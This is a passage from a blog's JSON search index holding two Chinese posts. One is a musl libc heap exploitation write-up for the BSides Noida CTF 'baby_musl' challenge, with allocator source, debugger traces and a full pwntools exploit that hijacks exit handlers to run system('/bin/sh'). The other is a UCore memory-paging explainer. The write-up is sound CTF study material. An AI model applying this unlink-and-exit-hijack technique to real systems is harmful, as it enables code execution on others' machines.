pretrim 条件，使用 pretrim 分割 c 否则使用 unbin 从链表中取出 c 最后对 chunk 进行 trim，返回给用户。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:2:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#malloc"},{"categories":["Pwning"],"content":"ubin static void unbin(struct chunk *c, int i) { if (c-\u003eprev == c-\u003enext) a_and_64(\u0026mal.binmap, ~(1ULL\u003c\u003ci)); c-\u003eprev-\u003enext = c-\u003enext; c-\u003enext-\u003eprev = c-\u003eprev; c-\u003ecsize |= C_INUSE; NEXT_CHUNK(c)-\u003epsize |= C_INUSE; } ubin相当于早期的unlink没有对双向链表进行检查，所以可以造成任意地址写。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:3:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#ubin"},{"categories":["Pwning"],"content":"pretrim /* pretrim - trims a chunk _prior_ to removing it from its bin. * Must be called with i as the ideal bin for size n, j the bin * for the _free_ chunk self, and bin j locked. */ static int pretrim(struct chunk *self, size_t n, int i, int j) { size_t n1; struct chunk *next, *split; /* We cannot pretrim if it would require re-binning. */ if (j \u003c 40) return 0; // 分配的bin的小标小于40 if (j \u003c i+3) { if (j != 63) return 0; // j是最后的bin，chunk实际大小与分配大小差值超过mmap阈值 n1 = CHUNK_SIZE(self); if (n1-n \u003c= MMAP_THRESHOLD) return 0; } else { // i和j相隔三个以上的bin n1 = CHUNK_SIZE(self); } // split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin if (bin_index(n1-n) != j) return 0; // 切割出一块大小为 n 的 chunk next = NEXT_CHUNK(self); split = (void *)((char *)self + n); split-\u003eprev = self-\u003eprev; split-\u003enext = self-\u003enext; split-\u003eprev-\u003enext = split; split-\u003enext-\u003eprev = split; split-\u003epsize = n | C_INUSE; split-\u003ecsize = n1-n; next-\u003epsize = n1-n; self-\u003ecsize = n | C_INUSE; return 1; } pretrim用于对chunk进行切割，准确来说就是设置对应位置的标志位等，防止将超出需求的chunk给用户造成浪费。使其进行切割的条件还是很严格的，一般是分配出的chunk大小与所需chunk相差很大的时候才切割。 static void trim(struct chunk *self, size_t n) { size_t n1 = CHUNK_SIZE(self); struct chunk *next, *split; // chunk 实际的大小 n1 多于 n DONTCARE (0x10) 字节 if (n \u003e= n1 - DONTCARE) return; // 将 self 的大小切割为 n，剩余部分成为新的 chunk split next = NEXT_CHUNK(self); split = (void *)((char *)self + n); split-\u003epsize = n | C_INUSE; split-\u003ecsize = n1-n | C_INUSE; next-\u003epsize = n1-n | C_INUSE; self-\u003ecsize = n | C_INUSE; __bin_chunk(split); } trim主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:4:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#pretrim"},{"categories":["Pwning"],"content":"free void free(void *p) { if (!p) return; struct chunk *self = MEM_TO_CHUNK(p); // 若 csize 没有设置 inuse 标志位，检查是否为 mmap chunk 或者 double free if (IS_MMAPPED(self)) unmap_chunk(self); else __bin_chunk(self); } static void unmap_chunk(struct chunk *self) { size_t extra = self-\u003epsize; char *base = (char *)self - extra; size_t len = CHUNK_SIZE(self) + extra; /* Crash on double free */ // 如果psize设置了inuse位，说明该chunk不是来着mmap分配的，double free if (extra \u0026 1) a_crash(); __munmap(base, len); } ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:5:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#free"},{"categories":["Pwning"],"content":"__bin_chunk void __bin_chunk(struct chunk *self) { struct chunk *next = NEXT_CHUNK(self); size_t final_size, new_size, size; int reclaim=0; int i; // new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小 final_size = new_size = CHUNK_SIZE(self); // next_chunk 中记录的psize与self的csize不符 /* Crash on corrupted footer (likely from buffer overflow) */ if (next-\u003epsize != self-\u003ecsize) a_crash(); // 检查 self 前后是否有空闲 chunk for (;;) { if (self-\u003epsize \u0026 next-\u003ecsize \u0026 C_INUSE) { // 若前后都在使用中 self-\u003ecsize = final_size | C_INUSE; next-\u003epsize = final_size | C_INUSE; i = bin_index(final_size); lock_bin(i); lock(mal.free_lock); if (self-\u003epsize \u0026 next-\u003ecsize \u0026 C_INUSE) // 直到前后都正在使用 break; unlock(mal.free_lock); unlock_bin(i); } // 向前合并空闲 chun if (alloc_rev(self)) { self = PREV_CHUNK(self); size = CHUNK_SIZE(self); final_size += size; if (new_size+size \u003e RECLAIM \u0026\u0026 (new_size+size^size) \u003e size) reclaim = 1; } // 向后合并空闲 chunk if (alloc_fwd(next)) { size = CHUNK_SIZE(next); final_size += size; if (new_size+size \u003e RECLAIM \u0026\u0026 (new_size+size^size) \u003e size) reclaim = 1; next = NEXT_CHUNK(next); } } // 在 binmap 中，将 bin i 设为非空 bin if (!(mal.binmap \u0026 1ULL\u003c\u003ci)) a_or_64(\u0026mal.binmap, 1ULL\u003c\u003ci); self-\u003ecsize = final_size; next-\u003epsize = final_size; unlock(mal.free_lock); // 将 self 加入到 bin i 链表的尾部 self-\u003enext = BIN_TO_CHUNK(i); self-\u003eprev = mal.bins[i].tail; self-\u003enext-\u003eprev = self; self-\u003eprev-\u003enext = self; /* Replace middle of large chunks with fresh zero pages */ if (reclaim) { uintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 \u0026 -PAGE_SIZE; uintptr_t b = (uintptr_t)next - SIZE_ALIGN \u0026 -PAGE_SIZE; #if 1 __madvise((void *)a, b-a, MADV_DONTNEED); #else __mmap((void *)a, b-a, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0); #endif } unlock_bin(i); } ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:6:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#__bin_chunk"},{"categories":["Pwning"],"content":"realloc void *realloc(void *p, size_t n) { struct chunk *self, *next; size_t n0, n1; void *new; if (!p) return malloc(n); if (adjust_size(\u0026n) \u003c 0) return 0; self = MEM_TO_CHUNK(p); n1 = n0 = CHUNK_SIZE(self); // mmaped chunk if (IS_MMAPPED(self)) { size_t extra = self-\u003epsize; char *base = (char *)self - extra; size_t oldlen = n0 + extra; size_t newlen = n + extra; /* Crash on realloc of freed chunk */ if (extra \u0026 1) a_crash(); if (newlen \u003c PAGE_SIZE \u0026\u0026 (new = malloc(n-OVERHEAD))) { n0 = n; goto copy_free_ret; } newlen = (newlen + PAGE_SIZE-1) \u0026 -PAGE_SIZE; if (oldlen == newlen) return p; base = __mremap(base, oldlen, newlen, MREMAP_MAYMOVE); if (base == (void *)-1) goto copy_realloc; self = (void *)(base + extra); self-\u003ecsize = newlen - extra; return CHUNK_TO_MEM(self); } next = NEXT_CHUNK(self); // size不一致 /* Crash on corrupted footer (likely from buffer overflow) */ if (next-\u003epsize != self-\u003ecsize) a_crash(); /* Merge adjacent chunks if we need more space. This is not * a waste of time even if we fail to get enough space, because our * subsequent call to free would otherwise have to do the merge. */ if (n \u003e n1 \u0026\u0026 alloc_fwd(next)) { // 尝试向后合并 n1 += CHUNK_SIZE(next); next = NEXT_CHUNK(next); } /* FIXME: find what's wrong here and reenable it..? */ if (0 \u0026\u0026 n \u003e n1 \u0026\u0026 alloc_rev(self)) { // 尝试向前合并 self = PREV_CHUNK(self); n1 += CHUNK_SIZE(self); } self-\u003ecsize = n1 | C_INUSE; next-\u003epsize = n1 | C_INUSE; /* If we got enough space, split off the excess and return */ if (n \u003c= n1) { // 当前chunk的size足够大，切割它，直接返回 //memmove(CHUNK_TO_MEM(self), p, n0-OVERHEAD); trim(self, n); return CHUNK_TO_MEM(self); } copy_realloc: /* As a last resort, allocate a new chunk and copy to it. */ new = malloc(n-OVERHEAD); // 尝试了合并后，仍没有满足要求，申请新chunk if (!new) return 0; copy_free_ret: memcpy(new, p, n0-OVERHEAD); // 数据拷贝 free(CHUNK_TO_MEM(self)); // free 原来的chunk return new; } p == NULL：malloc（new） p != NULL：无论如何都尝试前后合并 new\u003c=old：分割 new\u003eold： 可以满足：返回chunk指针 不能满足：malloc(new) new == 0 ：chunk被放入bin中 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:7:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#realloc"},{"categories":["Pwning"],"content":"例题：BSides Noida CTFyudai师傅ak了pwn太强了。 new unsigned __int64 new() { __int64 v0; // rbx __int64 v2; // [rsp+8h] [rbp-28h] BYREF size_t size; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v2); puts(\"Enter size\"); scanf(\"%lu\", \u0026size); v0 = v2; chunks[v0] = malloc(size); data[v2] = size; return __readfsqword(0x28u) ^ v4; } del unsigned __int64 del() { unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); if ( v1 \u003c= 3 \u0026\u0026 chunks[v1] ) free((void *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } edit unsigned __int64 edit() { unsigned __int64 idx; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026idx); if ( idx \u003c= 3 \u0026\u0026 chunks[idx] ) { puts(\"Enter data\"); read(0, (void *)chunks[idx], (int)data[idx]); } return __readfsqword(0x28u) ^ v2; } show unsigned __int64 show() { __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); puts((const char *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } 可以明显看到uaf，在new中没有处理下标，可以覆盖data数组实现溢出。musl libc的ubbin可进行任意地址写任意值，关键点是向什么地方写什么东西才能劫持程序流程。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#例题bsides-noida-ctf"},{"categories":["Pwning"],"content":"exit劫持查看exit源码： _Noreturn void exit(int code) { __funcs_on_exit(); __libc_exit_fini(); __stdio_exit(); _Exit(code); } /* Ensure that at least 32 atexit handlers can be registered without malloc */ #define COUNT 32 static struct fl { struct fl *next; // +0x00 8 Bytes void (*f[COUNT])(void *); // +0x08 8*32 Bytes void *a[COUNT]; // +0x108 8*32 Bytes } builtin, *head; // 0x208 512 Bytes [...] void __funcs_on_exit() { void (*func)(void *), *arg; LOCK(lock); for (; head; head=head-\u003enext, slot=COUNT) while(slot--\u003e0) { func = head-\u003ef[slot]; arg = head-\u003ea[slot]; UNLOCK(lock); func(arg); LOCK(lock); } } 在__funcs_on_exit中调用了多个函数，我们对exit进行调试。 ► 0x7f1bd68c1080 \u003cexit\u003e endbr64 0x7f1bd68c1084 \u003cexit+4\u003e push rbp 0x7f1bd68c1085 \u003cexit+5\u003e mov ebp, edi 0x7f1bd68c1087 \u003cexit+7\u003e call 0x7f1bd68cb570 \u003c0x7f1bd68cb570\u003e 0x7f1bd68c108c \u003cexit+12\u003e call 0x7f1bd6921f80 \u003c0x7f1bd6921f80\u003e 0x7f1bd68c1091 \u003cexit+17\u003e xor eax, eax 0x7f1bd68c1093 \u003cexit+19\u003e call 0x7f1bd6906ca0 \u003c0x7f1bd6906ca0\u003e 0x7f1bd68c1098 \u003cexit+24\u003e mov edi, ebp 0x7f1bd68c109a \u003cexit+26\u003e call _Exit \u003c_Exit\u003e 对应源码中四个函数 __funcs_on_exit对应汇编如下： =\u003e 0x7f1bd68cb570: endbr64 0x7f1bd68cb574: push r12 0x7f1bd68cb576: lea rdi,[rip+0x93beb] # 0x7f1bd695f168 0x7f1bd68cb57d: push rbp 0x7f1bd68cb57e: push rbx 0x7f1bd68cb57f: call 0x7f1bd6915500 # LOCK(lock) 0x7f1bd68cb584: mov rdx,QWORD PTR [rip+0x939cd] # 0x7f1bd695ef58 0x7f1bd68cb58b: test rdx,rdx # head 0x7f1bd68cb58e: je 0x7f1bd68cb630 0x7f1bd68cb594: mov ecx,DWORD PTR [rip+0x93bd2] # 0x7f1bd695f16c 0x7f1bd68cb59a: lea eax,[rcx-0x1] 0x7f1bd68cb59d: mov DWORD PTR [rip+0x93bc9],eax # 0x7f1bd695f16c 0x7f1bd68cb5a3: test ecx,ecx # slot 0x7f1bd68cb5a5: jle 0x7f1bd68cb600 0x7f1bd68cb5a7: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb5b0: lea rbx,[rip+0x93bb1] # 0x7f1bd695f168 lock 0x7f1bd68cb5b7: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb5c0: cdqe 0x7f1bd68cb5c2: mov rdi,rbx 0x7f1bd68cb5c5: lea rax,[rdx+rax*8] 0x7f1bd68cb5c9: mov r12,QWORD PTR [rax+0x108] # arg 0x7f1bd68cb5d0: mov rbp,QWORD PTR [rax+0x8] # func 0x7f1bd68cb5d4: call 0x7f1bd69155d0 # UNLOCK(lock) 0x7f1bd68cb5d9: mov rdi,r12 0x7f1bd68cb5dc: call rbp # \u003c--- func(arg) 0x7f1bd68cb5de: mov rdi,rbx 0x7f1bd68cb5e1: call 0x7f1bd6915500 # LOCK(lock) 0x7f1bd68cb5e6: mov edx,DWORD PTR [rip+0x93b80] # 0x7f1bd695f16c 0x7f1bd68cb5ec: lea eax,[rdx-0x1] 0x7f1bd68cb5ef: test edx,edx # slot 0x7f1bd68cb5f1: mov rdx,QWORD PTR [rip+0x93960] # 0x7f1bd695ef58 0x7f1bd68cb5f8: mov DWORD PTR [rip+0x93b6e],eax # 0x7f1bd695f16c 0x7f1bd68cb5fe: jg 0x7f1bd68cb5c0 0x7f1bd68cb600: mov DWORD PTR [rip+0x93b62],0x20 # 0x7f1bd695f16c 0x7f1bd68cb60a: mov rdx,QWORD PTR [rdx] 0x7f1bd68cb60d: mov QWORD PTR [rip+0x93944],rdx # 0x7f1bd695ef58 0x7f1bd68cb614: test rdx,rdx # head 0x7f1bd68cb617: je 0x7f1bd68cb630 0x7f1bd68cb619: mov DWORD PTR [rip+0x93b49],0x1f # 0x7f1bd695f16c 0x7f1bd68cb623: mov eax,0x1f 0x7f1bd68cb628: jmp 0x7f1bd68cb5b0 0x7f1bd68cb62a: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb630: pop rbx 0x7f1bd68cb631: pop rbp 0x7f1bd68cb632: pop r12 0x7f1bd68cb634: ret 经过分析，head的地址为0x7f1bd695ef58 pwndbg\u003e tele 0x7f1bd695ef58 00:0000│ 0x7f1bd695ef58 —▸ 0x7f1bd695f3e0 ◂— 0x7f1bd695f3e0 01:0008│ 0x7f1bd695ef60 (program_invocation_name) —▸ 0x7ffe5ce0216a ◂— './baby_musl' 02:0010│ 0x7f1bd695ef68 (program_invocation_short_name) —▸ 0x7ffe5ce0216c ◂— 'baby_musl' 03:0018│ 0x7f1bd695ef70 ◂— 0x0 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x556d8f800000 0x556d8f801000 r-xp 1000 0 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x556d8fa01000 0x556d8fa02000 r--p 1000 1000 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x556d8fa02000 0x556d8fa03000 rw-p 1000 2000 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x7f1bd68ac000 0x7f1bd68c1000 r--p 15000 0 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd68c1000 0x7f1bd6925000 r-xp 64000 15000 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd6925000 0x7f1bd695b000 r--p 36000 79000 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd695b000 0x7f1bd695c000 r--p 1000 ae000 /usr/lib/x86_64-linux-musl/l","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:1","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#exit劫持"},{"categories":["Pwning"],"content":"exp from pwn import * binary = './baby_musl' # context.terminal = ['tmux', 'splitw', '-h'] context(binary=binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF('/usr/lib/x86_64-linux-musl/libc.so') def leak(name, addr): return log.success( '{0}addr ---\u003e {1}'.format(name, hex(addr))) def cmd(idx): p.sendlineafter('[4] Show', str(idx)) def add(idx, size): cmd(1) p.sendlineafter('Enter index', str(idx)) p.sendlineafter('Enter size', str(size)) def dele(idx): cmd(2) p.sendlineafter('Enter index', str(idx)) def edit(idx, data): cmd(3) p.sendlineafter('Enter index', str(idx)) p.sendafter('Enter data', data) def show(idx): cmd(4) p.sendlineafter('Enter index', str(idx)) p.sendline('Niebelungen') add(0, 0x18) show(0) libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00')) - 0xb0dd0 fake_fl = libc_base + 0xb33e0 head_addr = libc_base + 0xb2f58 - 0x10 system = libc_base + libc.sym['system'] binsh = libc_base+next(libc.search('/bin/sh')) leak('libc addr', libc_base) add(1, 0x60) add(2, 0x208) # fake_fl dele(1) edit(1, p64(fake_fl) + p64(head_addr)) payload = p64(fake_fl) payload += b'A' * 0xf8 payload += p64(system) payload += b'A' * 0xf8 payload += p64(binsh) edit(2, payload) # gdb.attach(p) add(1, 0x10) p.sendline('0') p.interactive() ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:2","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#exp"},{"categories":["Pwning"],"content":"在正式开始写代码之前，我们先看看，整个内存管理的框架 参考：内存管理迷雾 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#"},{"categories":["Pwning"],"content":"虚拟内存在虚拟地址产生之前，cpu中使用的都是物理地址。所有的程序面对的都是主存的那块空间。这造成了一个问题，如果两个程序之间共享了一块物理内存空间，这两个程序就会相互影响。无论那块区域存放的是什么，被修改之后，就极有可能造成程序的崩溃。这样根本无法运行多个程序。 这里关键的问题是这两个程序都引用了绝对物理地址，而这正是我们最需要避免的。 我们可以把进程所使用的地址隔离开来，即让操作系统为每个进程分配独立的一套虚拟地址，每个进程面对的同样大小的虚拟内存空间，但所对应的物理地址不同。 如果程序要访问虚拟地址的时候，由操作系统转换成不同的物理地址，这样不同的进程运行的时候，写入的是不同的物理地址，这样就不会冲突了。 于是，这里就引出了两种地址的概念： 我们程序所使用的内存地址叫做虚拟内存地址（Virtual Memory Address） 实际存在硬件里面的空间地址叫物理内存地址（Physical Memory Address）。 操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示： ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#虚拟内存"},{"categories":["Pwning"],"content":"内存分段程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。 关于分段的映射我们在lab1中说过，是通过段选择子和偏移得到物理地址的。现在我们知道了虚拟地址是通过段表与物理地址进行映射的，分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址，如下图： 分段的办法很好，解决了程序本身不需要关心具体的物理内存地址的问题，但它也有一些不足之处： 第一个就是内存碎片的问题。 第二个就是内存交换的效率低的问题。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#内存分段"},{"categories":["Pwning"],"content":"内存碎片我们来看看这样一个例子。假设有 1G 的物理内存，用户执行了多个程序，其中： 游戏占用了 512MB 内存 浏览器占用了 128MB 内存 音乐占用了 256 MB 内存。 这个时候，如果我们关闭了浏览器，则空闲内存还有 1024 - 512 - 256 = 256MB。如果这个 256MB 不是连续的，被分成了两段 128 MB 内存，这就会导致没有空间再打开一个 200MB 的程序。 内存碎片的问题这里的内存碎片的问题共有两处地方： 外部内存碎片，也就是产生了多个不连续的小物理内存，导致新的程序无法被装载； 内部内存碎片，程序所有的内存都被装载到了物理内存，但是这个程序有部分的内存可能并不是很常使用，这也会导致内存的浪费； 针对上面两种内存碎片的问题，解决的方式会有所不同。解决外部内存碎片的问题就是内存交换。可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。这个内存交换空间，在 Linux 系统里，也就是我们常看到的 Swap 空间，这块空间是从硬盘划分出来的，用于内存与硬盘的空间交换。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#内存碎片"},{"categories":["Pwning"],"content":"内存交换效率对于多进程的系统来说，用分段的方式，内存碎片是很容易产生的，产生了内存碎片，那不得不重新 Swap 内存区域，这个过程会产生性能瓶颈。因为硬盘的访问速度要比内存慢太多了，每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上。所以，如果内存交换的时候，交换的是一个占内存空间很大的程序，这样整个机器都会显得卡顿。为了解决内存分段的内存碎片和内存交换效率低的问题，就出现了内存分页。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#内存交换效率"},{"categories":["Pwning"],"content":"内存分页分段的好处就是能产生连续的内存空间，但是会出现内存碎片和内存交换的空间太大的问题。要解决这些问题，那么就要想出能少出现一些内存碎片的办法。另外，当需要进行内存交换的时候，让需要交换写入或者从磁盘装载的数据更少一点，这样就可以解决问题了。这个办法，也就是内存分页（Paging）。分页是把整个虚拟和物理内存空间切成一段段固定尺寸的大小。这样一个连续并且尺寸固定的内存空间，我们叫页（Page）。在 Linux 下，每一页的大小为 4KB。虚拟地址与物理地址之间通过页表来映射，如下图： 内存映射页表实际上存储在 CPU 的内存管理单元 （MMU) 中，于是 CPU 就可以直接通过 MMU，找出要实际要访问的物理内存地址。而当进程访问的虚拟地址在页表中查不到时，系统会产生一个缺页异常，进入系统内核空间分配物理内存、更新进程页表，最后再返回用户空间，恢复进程的运行。 分页是怎么解决分段的内存碎片、内存交换效率低的问题？ 由于内存空间都是预先划分好的，也就不会像分段会产生间隙非常小的内存，这正是分段会产生内存碎片的原因。而采用了分页，那么释放的内存都是以页为单位释放的，也就不会产生无法给进程使用的小内存。如果内存空间不够，操作系统会把其他正在运行的进程中的「最近没被使用」的内存页面给释放掉，也就是暂时写在硬盘上，称为换出（Swap Out）。一旦需要的时候，再加载进来，称为换入（Swap In）。所以，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，内存交换的效率就相对比较高。 换入换出更进一步地，分页的方式使得我们在加载程序的时候，不再需要一次性都把程序加载到物理内存中。我们完全可以在进行虚拟内存和物理内存的页之间的映射之后，并不真的把页加载到物理内存里，而是只有在程序运行中，需要用到对应虚拟内存页里面的指令和数据时，再加载到物理内存里面去。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#内存分页"},{"categories":["Pwning"],"content":"分页机制下虚拟地址和物理地址的映射在分页机制下，虚拟地址分为两部分，页号和页内偏移。页号作为页表的索引，页表包含物理页每页所在物理内存的基地址，这个基地址与页内偏移的组合就形成了物理内存地址，见下图。 内存分页寻址总结一下，对于一个内存地址转换，其实就是这样三个步骤： 把虚拟内存地址，切分成页号和偏移量； 根据页号，从页表里面，查询对应的物理页号； 直接拿物理页号，加上前面的偏移量，就得到了物理内存地址。 下面举个例子，虚拟内存中的页通过页表映射为了物理内存中的页，如下图： 虚拟页与物理页的映射这看起来似乎没什么毛病，但是放到实际中操作系统，这种简单的分页是肯定是会有问题的。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#分页机制下虚拟地址和物理地址的映射"},{"categories":["Pwning"],"content":"分页的缺陷有空间上的缺陷。因为操作系统是可以同时运行非常多的进程的，那这不就意味着页表会非常的庞大。在 32 位的环境下，虚拟地址空间共有 4GB，假设一个页的大小是 4KB（2^12），那么就需要大约 100 万 （2^20） 个页，每个「页表项」需要 4 个字节大小来存储，那么整个 4GB 空间的映射就需要有 4MB 的内存来存储页表。这 4MB 大小的页表，看起来也不是很大。但是要知道每个进程都是有自己的虚拟地址空间的，也就说都有自己的页表。那么，100 个进程的话，就需要 400MB 的内存来存储页表，这是非常大的内存了，更别说 64 位的环境了。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#分页的缺陷"},{"categories":["Pwning"],"content":"多级页表要解决上面的问题，就需要采用的是一种叫作多级页表（Multi-Level Page Table）的解决方案。在前面我们知道了，对于单页表的实现方式，在 32 位和页大小 4KB 的环境下，一个进程的页表需要装下 100 多万个「页表项」，并且每个页表项是占用 4 字节大小的，于是相当于每个页表需占用 4MB 大小的空间。我们把这个 100 多万个「页表项」的单级页表再分页，将页表（一级页表）分为 1024 个页表（二级页表），每个表（二级页表）中包含 1024 个「页表项」，形成二级分页。如下图所示： 你可能会问，分了二级表，映射 4GB 地址空间就需要 4KB（一级页表）+ 4MB（二级页表）的内存，这样占用空间不是更大了吗？ 当然如果 4GB 的虚拟地址全部都映射到了物理内上的，二级分页占用空间确实是更大了，但是，我们往往不会为一个进程分配那么多内存。其实我们应该换个角度来看问题，还记得计算机组成原理里面无处不在的局部性原理么？每个进程都有 4GB 的虚拟地址空间，而显然对于大多数程序来说，其使用到的空间远未达到 4GB，因为会存在部分对应的页表项都是空的，根本没有分配，对于已分配的页表项，如果存在最近一定时间未访问的页表，在物理内存紧张的情况下，操作系统会将页面换出到硬盘，也就是说不会占用物理内存。如果使用了二级分页，一级页表就可以覆盖整个 4GB 虚拟地址空间，但如果某个一级页表的页表项没有被用到，也就不需要创建这个页表项对应的二级页表了，即可以在需要时才创建二级页表。做个简单的计算，假设只有 20% 的一级页表项被用到了，那么页表占用的内存空间就只有 4KB（一级页表） + 20% * 4MB（二级页表）= 0.804MB，这对比单级页表的 4MB 是不是一个巨大的节约？那么为什么不分级的页表就做不到这样节约内存呢？我们从页表的性质来看，保存在内存中的页表承担的职责是将虚拟地址翻译成物理地址。假如虚拟地址在页表中找不到对应的页表项，计算机系统就不能工作了。所以页表一定要覆盖全部虚拟地址空间，不分级的页表就需要有 100 多万个页表项来映射，而二级分页则只需要 1024 个页表项（此时一级页表覆盖到了全部虚拟地址空间，二级页表在需要时创建）。我们把二级分页再推广到多级页表，就会发现页表占用的内存空间更少了，这一切都要归功于对局部性原理的充分应用。对于 64 位的系统，两级分页肯定不够了，就变成了四级目录，分别是： 全局页目录项 PGD（Page Global Directory）； 上层页目录项 PUD（Page Upper Directory）； 中间页目录项 PMD（Page Middle Directory）； 页表项 PTE（Page Table Entry）； ","date":"2021-07-10","objectID":"/ucore-lab-2/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#多级页表"},{"categories":["Pwning"],"content":"TLB多级页表虽然解决了空间上的问题，但是虚拟地址到物理地址的转换就多了几道转换的工序，这显然就降低了这俩地址转换的速度，也就是带来了时间上的开销。程序是有局部性的，即在一段时间内，整个程序的执行仅限于程序中的某一部分。相应地，执行所访问的存储空间也局限于某个内存区域。 程序的局部性我们就可以利用这一特性，把最常访问的几个页表项存储到访问速度更快的硬件，于是计算机科学家们，就在 CPU 芯片中，加入了一个专门存放程序最常访问的页表项的 Cache，这个 Cache 就是 TLB（Translation Lookaside Buffer） ，通常称为页表缓存、转址旁路缓存、快表等。 地址转换在 CPU 芯片里面，封装了内存管理单元（Memory Management Unit）芯片，它用来完成地址转换和 TLB 的访问与交互。有了 TLB 后，那么 CPU 在寻址时，会先查 TLB，如果没找到，才会继续查常规的页表。TLB 的命中率其实是很高的，因为程序最常访问的页就那么几个。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#tlb"},{"categories":["Pwning"],"content":"段页式内存管理内存分段和内存分页并不是对立的，它们是可以组合起来在同一个系统中使用的，那么组合起来后，通常称为段页式内存管理。 段页式地址空间段页式内存管理实现的方式： 先将程序划分为多个有逻辑意义的段，也就是前面提到的分段机制； 接着再把每个段划分为多个页，也就是对分段划分出来的连续空间，再划分固定大小的页； 